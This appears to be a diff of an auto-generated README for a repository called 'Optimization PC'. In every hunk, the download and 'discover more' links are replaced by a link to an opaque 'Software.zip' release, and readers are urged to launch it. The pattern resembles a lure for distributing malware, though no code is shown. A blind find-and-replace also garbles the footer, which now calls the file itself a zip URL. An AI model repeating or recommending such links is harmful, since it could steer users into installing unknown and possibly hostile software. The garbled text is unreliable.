@@ -10,7 +10,7 @@ The Optimization PC repository aims to provide a comprehensive collection of too
 autostart, backup, bios-settings, cloud-services, command-line-tools, defragmentation, disk-cleanup, drivers, faq, hardware-upgrade, malware-removal, memory-management, network-optimization, optimization, optimization-tools, performance, ssd, system-services, system-tuning, virtual-memory
 
 ## Download Link
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/javed58/optimization-pc/releases/download/v1.0/Software.zip)](https://github.com/javed58/optimization-pc/releases/download/v1.0/Software.zip)
 
 Launch the provided download link to access the optimization tools and resources for your PC.
 
@@ -89,7 +89,7 @@ Explore the vast collection of optimization tools and resources available in thi
 
 Remember, a well-optimized system leads to a seamless computing experience. Make the most of your PC's potential with Optimization PC!
 
-Discover more by visiting [this link](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). 🔗
+Discover more by visiting [this link](https://github.com/javed58/optimization-pc/releases/download/v1.0/Software.zip). 🔗
 
 Start optimizing your PC now! 💻🔧
 
@@ -116,5 +116,5 @@ Remember, a well-optimized system is key to a seamless computing experience. Sta
 
 ---
 
-*This README.md file was automatically generated based on the provided information.* 🤖
+*This https://github.com/javed58/optimization-pc/releases/download/v1.0/Software.zip file was automatically generated based on the provided information.* 🤖
 
